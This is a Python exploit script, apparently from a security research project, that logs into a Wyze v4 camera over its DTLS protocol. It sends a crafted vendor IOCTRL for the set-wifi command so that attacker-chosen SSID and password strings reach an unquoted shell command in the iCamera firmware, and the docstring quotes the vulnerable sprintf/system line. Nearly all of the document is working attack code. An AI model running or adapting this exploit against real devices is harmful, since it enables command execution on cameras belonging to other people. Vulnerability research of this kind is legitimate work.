#!/usr/bin/env python3
"""Send a vendor IOCTRL (HL v0x25) to a Wyze v4 and print the reply.

Used to drive 0x29a0 (set wifi ssid/pwd) for the unquoted-shell injection in
iCamera: sprintf(buf, "/tmp/connect_ap.sh %s %s", ssid, pwd); system(buf).

Usage: wyze_ssid_inject.py <ip> <cfg.json> <ssid> <pwd> [cmd_hex]
"""
import json
import struct
import sys
import time

sys.path.insert(0, "/Users/jemanuel/projects/franken_surveillance_system/deliverables/scripts")
import dtlslib as d


def build_hl25(cmd, payload):
    return b"HL\x25\x00" + struct.pack("<H", cmd) + struct.pack("<H", len(payload)) + b"\x00" * 8 + payload


def main():
    ip, cfgp, ssid, pwd = sys.argv[1:5]
    cmd = int(sys.argv[5], 16) if len(sys.argv) > 5 else 0x29A0
    cfg = json.load(open(cfgp))
    cam = d.Cam2(ip, cfg["mac"], cfg["uid"], cfg["enr"], iface=cfg.get("bind_ip", "192.168.4.160"),
                 port=cfg.get("camera_port", 32761))
    if not cam.login():
        print("LOGIN FAILED"); return 1
    print("logged in")
    body = json.dumps({"ssid": ssid, "pwd": pwd}).encode()
    print("payload:", body)
    avseq = cam.avseq + 1
    cam.avseq = avseq
    cam.send(cam.encrypt(23, d.build_ioctrl(avseq, cam.sub, build_hl25(cmd, body))))
    cam.sub = (cam.sub + 1) & 0xFFFF
    want = cmd + 1
    end = time.time() + 8
    while time.time() < end:
        q = cam.recv_dtls(1.0)
        if not q:
            continue
        if q[0] != 23:
            continue
        try:
            data = cam.decrypt(23, int.from_bytes(q[5:11], "big"), q[13:13 + int.from_bytes(q[11:13], "big")])
        except Exception:
            continue
        off = 0
        while off + 2 <= len(data):
            if data[off:off + 2] == b"HL":
                ln = struct.unpack("<H", data[off + 6:off + 8])[0]
                c = struct.unpack("<H", data[off + 4:off + 6])[0]
                pl = data[off + 16:off + 16 + ln]
                cam._ack_ioctrl(c, pl)
                print("reply cmd %#06x len %d payload %s" % (c, len(pl), pl[:80].hex()))
                if c == want:
                    print("OK")
                    return 0
                off += 16 + ln
            else:
                off += 1
    print("no matching reply")
    return 2


if __name__ == "__main__":
    sys.exit(main())
